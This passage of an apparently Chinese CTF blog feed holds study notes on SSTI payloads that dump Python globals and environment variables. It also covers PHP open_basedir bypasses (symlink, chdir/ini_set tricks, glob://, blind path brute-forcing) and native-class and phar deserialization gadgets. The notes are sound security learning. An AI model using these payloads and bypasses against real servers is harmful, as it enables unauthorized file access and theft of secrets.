class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://localhost:5000/?username=&#123;passhash.__class__.__str__.__globals__[passhash]&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    req = requests.get(url+<span class="string">f&quot;[<span class="subst">&#123;i&#125;</span>]&quot;</span>+<span class="string">&quot;&#125;&amp;password=2&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure></li></ol></li><li><p>登录后提示 flag 在环境变量里面</p><ol><li>ssti命令执行阶段</li><li>payload: <code>username=&#123;passhash.__str__.__globals__[app].__init__.__globals__[os].environ&#125;&amp;password=2</code></li><li>payload2: <code>&#123;passhash.__class__.__repr__.__globals__[app].__init__.__globals__[os].environ&#125;</code></li></ol></li></ol><h2 id="HTTP-java-ssrf"><a href="#HTTP-java-ssrf" class="headerlink" title="HTTP: java ssrf"></a>HTTP: java ssrf</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>web02中一定要比较清楚几个判断逻辑，尤其在<code>file_get_contents()</code>这里和<strong>自动转换</strong>，最好实操一下，不要一意孤行，Array不会自动转为string，下列的转换是在<code>.</code>的作用下才</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> php </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php的disable_function绕过</title>
      <link href="/2024/11/08/php%E7%9A%84disable_function%E7%BB%95%E8%BF%87/"/>
      <url>/2024/11/08/php%E7%9A%84disable_function%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> all in one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php的open_basedir绕过</title>
      <link href="/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/"/>
      <url>/2024/11/08/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这里侧重于目录读写，在php5.3以后很少有能够绕过open_basedir读写文件的方法(源自p牛原句)<br>很多条件都需要在linux下的php环境才可以实现，windows中phpstudy有很多搞不出来</p></blockquote><h2 id="bypass-ref"><a href="#bypass-ref" class="headerlink" title="bypass ref"></a>bypass ref</h2><ol><li><a href="http://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">很不错，详细并且有版本信息</a></li><li><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">p牛的补充</a></li></ol><h2 id="什么是open-basedir"><a href="#什么是open-basedir" class="headerlink" title="什么是open_basedir?"></a>什么是open_basedir?</h2><ul><li>ref<ul><li><a href="https://www.php.net/manual/en/ini.core.php">官方文档</a></li></ul></li></ul><ol><li>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域，对于目录和文件内容都生效<ol><li>使用open_basedir指定的限制是目录名，而不是前缀。</li><li>设置open_basedir的方法，在linux下，不同的目录由<code>:</code>分割，如<code>/var/www/:/tmp/</code>；在Windows下不同目录由<code>;</code>分割，如<code>c:/www;c:/windows/temp</code>。</li></ol></li><li><em><strong>对于符号链接</strong></em><ol><li>所有的符号链接都被解析，所以不可能用符号链接来避免这个限制。如果文件不存在，则无法解析符号链接，并将文件名与（已解析的）open_basedir进行比较 -&gt; 会进行解析后比较</li><li>警惕使用<code>.</code>因为脚本的工作目录可以很容易地用chdir（）更改</li></ol></li><li><em><strong>命令执行函数不怕open_basedir</strong></em> –&gt; 命令执行函数更加怕disable_functions</li></ol><h2 id="访问根目录绕过"><a href="#访问根目录绕过" class="headerlink" title="访问根目录绕过"></a>访问根目录绕过</h2><h3 id="1-原生类-DirectoryIterator-glob"><a href="#1-原生类-DirectoryIterator-glob" class="headerlink" title="1. 原生类: DirectoryIterator+glob:&#x2F;&#x2F;"></a>1. 原生类: DirectoryIterator+glob:&#x2F;&#x2F;</h3><blockquote><p>windows11 + php7.3.4 phpstudy 不可行<br>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ?c=glob:///*</span></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-函数-opendir-readdir-glob"><a href="#2-函数-opendir-readdir-glob" class="headerlink" title="2. 函数: opendir()+readdir()+glob:&#x2F;&#x2F;"></a>2. 函数: opendir()+readdir()+glob:&#x2F;&#x2F;</h3><blockquote><p>windows11 + php7.3.4 phpstudy 不可行<br>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ?c=glob:///*;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 需要通过循环进行输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-函数-scandir-glob"><a href="#3-函数-scandir-glob" class="headerlink" title="3. 函数: scandir()+glob:&#x2F;&#x2F;"></a>3. 函数: scandir()+glob:&#x2F;&#x2F;</h3><blockquote><p>windows11 + php7.3.4 phpstudy 不可行<br>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径</p></blockquote><ol><li>只能列出根目录和open_basedir允许目录下的文件</li><li><code>var_dump(scandir(&quot;glob:///*&quot;));</code></li></ol><h2 id="访问任意目录"><a href="#访问任意目录" class="headerlink" title="访问任意目录"></a>访问任意目录</h2><h3 id="1-函数-symlink-mkdir-chdir-unlink"><a href="#1-函数-symlink-mkdir-chdir-unlink" class="headerlink" title="1. 函数: symlink() + mkdir() + chdir() + unlink()"></a>1. 函数: symlink() + mkdir() + chdir() + unlink()</h3><blockquote><p>windows11 + php7.3.4 phpstudy 不可行<br>在windows上的unlink()函数还要看版本<br>似乎没有找到讲解原理的</p></blockquote><ol><li><p>对于普通的symlink()如<code>symlink(&quot;../../flag.txt&quot;,&quot;exp&quot;)</code>而言，open_basedir是可以进行限制的</p></li><li><p>但是通过以下payload即可进行构造访问其他目录</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;B&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line"><span class="comment">// 新建的目录深度为2，回到current/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&quot;A/B&quot;</span>,<span class="string">&quot;tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&quot;tmp/../../&quot;</span>,<span class="string">&quot;exp&quot;</span>); <span class="comment">// exp指向current/A/B/../../也就是本目录，合法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;tmp&quot;</span>);   <span class="comment">// 将tmp指向current/tmp，这是exp执行current/../</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 要向上n个目录/n个目录的文件，需要创建n+1个新目录并添加n+1个../才可以到达</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-函数-chdir-ini-set"><a href="#2-函数-chdir-ini-set" class="headerlink" title="2. 函数: chdir() + ini_set()"></a>2. 函数: chdir() + ini_set()</h3><ol><li>思路时通过<strong>相对</strong>的观念进行绕过</li><li>ref<ol><li><strong>一叶飘零师傅底层原理，原站关了，这里可以从github.io下载到源html</strong>，我给放到这一节的pic里md文件里，感觉还是不清晰啊</li><li><a href="https://www.163.com/dy/article/ECQSCP9E0511CJ6O.html">像是被搬运到这里，没有看懂</a> search php_check_open_basedir_ex<ol><li>expand_filepath()全身心的投入在相对路径和绝对路径，没有考虑open_basedir如果为相对路径会实时变化的问题</li></ol></li></ol></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一句话格式</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;sub&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;sub&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line"><span class="comment">// 重点在于先mkdir(&quot;sub&quot;)再chdir(&quot;sub&quot;)这一步，可以通过..往上跳跃</span></span><br><span class="line"><span class="comment">// 最后到/根目录后再进行重新设置覆盖</span></span><br></pre></td></tr></table></figure><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><blockquote><p>这类还是不是很推荐进行使用的，需要爆破搞个字典搞</p></blockquote><h3 id="0-对于windows-php有用的通配符脚本"><a href="#0-对于windows-php有用的通配符脚本" class="headerlink" title="0. *对于windows+php有用的通配符脚本"></a>0. *对于windows+php有用的通配符脚本</h3><blockquote><p>如果使用linux则还是需要进行暴力破解，这里说的使用的server的平台</p></blockquote><ol><li>ref<ol><li><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">来自p牛的解释</a></li><li><a href="https://comwrg.github.io/1000php/bugs/wooyun-2014-071540">windows通配符</a></li></ol></li><li>windows+php中<ol><li>大于号(&gt;)相当于通配符问号(?)</li><li>小于号(&lt;)相当于通配符星号(*)</li><li><img src="/pic/php%E7%9A%84open_basedir%E7%BB%95%E8%BF%87/brute_with_glob.png" alt="brute with glob"></li></ol></li><li>Notice: <strong>如果首字母相同</strong>，我们只需要再枚举第二个字符、第三个字符依次类推，即可列举出目录中所有文件</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"><span class="variable">$basedir</span> = <span class="string">&#x27;D:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$basedir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>); <span class="comment">// 重点在于这里</span></span><br><span class="line">    <span class="variable">$re</span> = <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getRealPath</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$re</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">dump</span>(<span class="variable">$re</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dump</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$s</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line">    <span class="title function_ invoke__">flush</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-函数-bindtextdomain"><a href="#1-函数-bindtextdomain" class="headerlink" title="1. 函数: bindtextdomain()"></a>1. 函数: bindtextdomain()</h3><blockquote><p>windows下默认是没有这个函数的，而在linux下不能使用通配符进行目录的猜解，不是好选择</p></blockquote><ol><li><code>bindtextdomain(string $domain, ?string $directory): string|false</code><ol><li>利用原理是<strong>基于报错</strong>：bindtextdomain()函数的第二个参数$directory是一个文件路径，它会在$directory存在的时候返回$directory，不存在则返回false –&gt; <strong>盲注</strong></li></ol></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bindtextdomain</span></span><br><span class="line"><span class="variable">$re</span> = <span class="title function_ invoke__">bindtextdomain</span>(<span class="string">&#x27;xxx&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$re</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-原生类-SplFileInfo-getRealPath"><a href="#2-原生类-SplFileInfo-getRealPath" class="headerlink" title="2. 原生类: SplFileInfo::getRealPath()"></a>2. 原生类: SplFileInfo::getRealPath()</h3><blockquote><p>(PHP 5 &gt;&#x3D; 5.1.2, PHP 7, PHP 8)</p></blockquote><ol><li>getRealPath()用于获取文件的绝对路径。bypass原理同样是<strong>基于报错</strong>，该方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还<strong>直接忽略了open_basedir的设定</strong> –&gt; 这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径 from p牛</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SplFileInfo</span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getRealPath</span>());</span><br></pre></td></tr></table></figure><h3 id="3-函数-realpath-string-path-string-false"><a href="#3-函数-realpath-string-path-string-false" class="headerlink" title="3. 函数: realpath(string $path): string|false"></a>3. 函数: realpath(string $path): string|false</h3><blockquote><p>Windows下才可以</p></blockquote><ol><li>realpath()返回规范化的绝对路径名,它可以去掉多余的..&#x2F;或.&#x2F;等跳转字符，能将相对路径转换成绝对路径</li><li><strong>盲注</strong>: 在开启了open_basedir的情况下，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在open_basedir里的文件的话，他就会返回file is not within the allowed path(s)</li></ol><h3 id="4-拓展库函数-GD库imageftbbox-imagefttext"><a href="#4-拓展库函数-GD库imageftbbox-imagefttext" class="headerlink" title="4. 拓展库函数: GD库imageftbbox&#x2F;imagefttext"></a>4. 拓展库函数: GD库imageftbbox&#x2F;imagefttext</h3><blockquote><p>有加载对于库<br>这个方法报错的时候并不会把真正的路径爆出来，这也是其与realpath的最大不同之处。所以，我们只能一位一位地猜测，即使再windows下使用通配符&lt;&gt;都不可以</p></blockquote><ol><li>GD库一般是PHP必备的扩展库之一</li><li>拿imageftbbox举个例子，这个函数第三个参数是字体的路径。发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误 –&gt; <strong>盲注</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(<span class="string">&#x27;isexists&#x27;</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span></span><br><span class="line">    <span class="comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span></span><br><span class="line">    <span class="title function_ invoke__">imageftbbox</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="variable">$file</span>, <span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$errstr</span>, <span class="string">&#x27;Invalid font filename&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&lt;br/&gt;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> all in one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_反序列化</title>
      <link href="/2024/11/08/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/11/08/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
            <tag> php serialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化利用</title>
      <link href="/2024/11/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/"/>
      <url>/2024/11/07/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="UNDONE"><a href="#UNDONE" class="headerlink" title="UNDONE"></a>UNDONE</h2><ol><li>phar反序列化中关键标识绕过可以任意zip等吗？</li><li>phar出发函数支持通配符吗？</li><li>phar是可以没有</li><li>[<a href="https://blog.csdn.net/MrWangisgoodboy/article/details/130146658]%E4%B8%ADphar%E7%AD%BE%E5%90%8D%E9%97%AE%E9%A2%98">https://blog.csdn.net/MrWangisgoodboy/article/details/130146658]中phar签名问题</a></li><li>session上传中无需进行闭合吗？其实要闭合也不难的，也是origin和target这样，往target凑即可</li></ol><h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><h3 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h3><h2 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h2><h3 id="php可利用原生类"><a href="#php可利用原生类" class="headerlink" title="php可利用原生类"></a>php可利用原生类</h3><blockquote><p>SPL php标准库[<a href="https://www.php.net/manual/zh/book.spl.php]">https://www.php.net/manual/zh/book.spl.php]</a></p></blockquote><ol><li><p>常见的原生类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="built_in">Error</span></span><br><span class="line"><span class="built_in">Exception</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 网络</span></span><br><span class="line">SoapClient</span><br><span class="line">SimpleXMLElement</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件系统</span></span><br><span class="line"><span class="built_in">DirectoryIterator</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span></span><br><span class="line"><span class="built_in">SplFileObject</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>脚本筛选</strong></em></p><ol><li>可以用来获取存在给定方法的原生类</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">            // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h3><blockquote><p>有三个类: DirectoryIterator, FilesystemIterator, GlobIterator</p></blockquote><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><blockquote><p>SplFileObject: [<a href="https://www.php.net/manual/zh/class.splfileobject.php]">https://www.php.net/manual/zh/class.splfileobject.php]</a></p></blockquote><h2 id="Phar利用"><a href="#Phar利用" class="headerlink" title="Phar利用"></a>Phar利用</h2><blockquote><p>目的与特性：在没有<code>unserialize()</code>函数的情况下通过文件系统调用</p></blockquote><h3 id="Phar-Ref"><a href="#Phar-Ref" class="headerlink" title="Phar Ref"></a>Phar Ref</h3><ol><li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">blackhat祖师爷</a></li><li><a href="https://paper.seebug.org/680/">知道创宇简要介绍</a></li><li><a href="https://www.freebuf.com/articles/web/291992.html">绕过技巧</a></li><li><a href="https://www.anquanke.com/post/id/240007#h2-5"><em><strong>为什么非phar文件也可以进行反序列化?</strong></em></a><ol><li><a href="https://guokeya.github.io/post/uxwHLckwx/">生成脚本，但是不详细</a></li></ol></li></ol><h3 id="what-why"><a href="#what-why" class="headerlink" 